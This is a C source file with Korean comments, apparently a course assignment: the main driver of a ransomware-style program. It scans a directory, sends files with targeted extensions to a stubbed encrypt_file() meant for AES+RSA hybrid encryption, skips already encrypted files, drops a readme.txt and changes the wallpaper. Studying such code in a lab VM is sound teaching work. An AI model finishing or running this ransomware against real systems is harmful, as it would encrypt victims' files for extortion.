#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <libgen.h> // basename()을 사용하기 위해 추가

#include "extension.h"
#include "readme.h"
#include "ChangeWallPaper.h"
#include "encrypt.h"

/*
 * main.c
 *
 * TODO:
 * - 여기서는 "디렉터리 전체를 순회 → 암호화 대상 확장자만 encrypt_file() 호출"
 * 하는 흐름만 구현되어 있다.
 * - 추가:
 * * 이미 암호화된 파일(.enc) 건너뛰기
 * * readme.txt / 암호화 프로그램 자체(red4 등)는 제외
 */

static const char *g_prog_name = NULL; // 전역 변수로 프로그램 이름 저장

static void usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <target_directory>\n", prog);
}

// 파일 이름이 특정 확장자로 끝나는지 확인하는 헬퍼 함수
static int ends_with(const char *str, const char *suffix) {
    if (!str || !suffix) {
        return 0;
    }
    size_t len_str = strlen(str);
    size_t len_suffix = strlen(suffix);
    if (len_suffix > len_str) {
        return 0;
    }
    return strncmp(str + len_str - len_suffix, suffix, len_suffix) == 0;
}

/* ---------------------------------------------------------
 * 디렉터리 내부 파일만 탐색 (비재귀)
 * - 하위 디렉터리(서브폴더)는 들어가지 않고, 인자로 받은 디렉터리
 * 바로 아래에 있는 파일들만 대상으로 한다.
 * --------------------------------------------------------- */
static void process_directory(const char *target_dir)
{
    DIR *dp;
    struct dirent *entry;
    char filepath[1024];

    dp = opendir(target_dir);
    if (!dp) {
        perror("[ERROR] opendir");
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
        const char *filename = entry->d_name;

        // "." 과 ".." 건너뛰기
        if (strcmp(filename, ".") == 0 ||
            strcmp(filename, "..") == 0)
            continue;

        // 전체 경로 생성: "<target_dir>/<파일명>"
        if (snprintf(filepath, sizeof(filepath), "%s/%s", target_dir, filename)
            >= (int)sizeof(filepath)) {
            fprintf(stderr, "[ERROR] path too long, skip: %s/%s\n",
                    target_dir, filename);
            continue;
        }

        struct stat st;
        if (stat(filepath, &st) == -1) {
            perror("[ERROR] stat");
            continue;
        }

        if (S_ISREG(st.st_mode)) {
            // 암호화 제외 대상 파일 처리 (TODO 주석 구현)

            // 1. 이미 암호화된 파일(.enc) 건너뛰기
            if (ends_with(filename, ".enc")) {
                printf("[INFO] Skip already encrypted file: %s\n", filepath);
                continue;
            }

            // 2. readme.txt 건너뛰기
            // README_FILENAME은 "readme.h" 또는 "readme.c"에 정의되어 있다고 가정
            // (여기서는 일단 "readme.txt"로 하드코딩)
            if (strcmp(filename, "readme.txt") == 0) {
                printf("[INFO] Skip readme file: %s\n", filepath);
                continue;
            }

            // 3. 암호화 프로그램 자체(예: red4)는 제외
            // g_prog_name은 main()에서 설정된 프로그램 실행 파일의 basename이어야 함
            if (g_prog_name && strcmp(filename, g_prog_name) == 0) {
                printf("[INFO] Skip executable file: %s\n", filepath);
                continue;
            }

            if (extension_check(filepath)) {
                /*
                 * TODO: encrypt_file() 내부에 실제 AES-128-CBC + RSA 하이브리드
                 * 암호화 로직을 네가 직접 구현해야 한다.
                 * (현재는 스텁(stub)으로 평문을 그대로 복사하는 상태)
                 */
                encrypt_file(filepath);
            }
        }
    }

    closedir(dp);
}

int main(int argc, char *argv[])
{
    // 프로그램 경로 복사를 위한 변수 초기화
    char *prog_path_copy = NULL; 

    if (argc != 2) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    // 프로그램 실행 파일 이름만 추출하여 전역 변수에 저장 (libgen.h의 basename 사용)
    // argv[0]는 수정될 수 있으므로 사본을 생성합니다.
    prog_path_copy = strdup(argv[0]);
    if (prog_path_copy) {
        g_prog_name = basename(prog_path_copy);
    } else {
        fprintf(stderr, "[WARN] Failed to duplicate program name path.\n");
    }

    const char *target_dir = argv[1];

    printf("[INFO] Target directory: %s\n", target_dir);

    // target_dir에 대해 stat()을 먼저 호출해서 디렉터리가 아니면 에러 처리
    struct stat st;
    if (stat(target_dir, &st) == -1) {
        perror("[ERROR] stat on target_dir");
        if (prog_path_copy) free(prog_path_copy);
        return EXIT_FAILURE;
    }
    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "[ERROR] Target path is not a directory: %s\n", target_dir);
        if (prog_path_copy) free(prog_path_copy);
        return EXIT_FAILURE;
    }


    process_directory(target_dir);

    /*
     * TODO(필요 시):
     * - readme.txt의 내용이나 파일 이름을 바꾸고 싶다면 readme.c/README_CONTENT 수정.
     */
    if (write_readme(target_dir) != 0) {
        fprintf(stderr, "[ERROR] failed to create readme.txt\n");
    }

    /*
     * TODO(선택):
     * - change_wallpaper() 안에 실제 바탕화면 변경 코드를 구현했다면,
     * 여기 인자로 넘기는 경로를 과제에서 사용할 이미지 파일 위치로 바꿔야 한다.
     * - 실제 환경 보호를 위해, 과제용 VM에서만 사용하거나
     * "실제 변경 대신 로그만 출력"하도록 두는 것도 한 방법이다.
     */
    if (change_wallpaper("/path/to/new_wallpaper.png") != 0) {
        fprintf(stderr, "[ERROR] failed to change wallpaper\n");
    }

    printf("[INFO] Done.\n");
    if (prog_path_copy) free(prog_path_copy); // 메모리 해제
    return EXIT_SUCCESS;
}
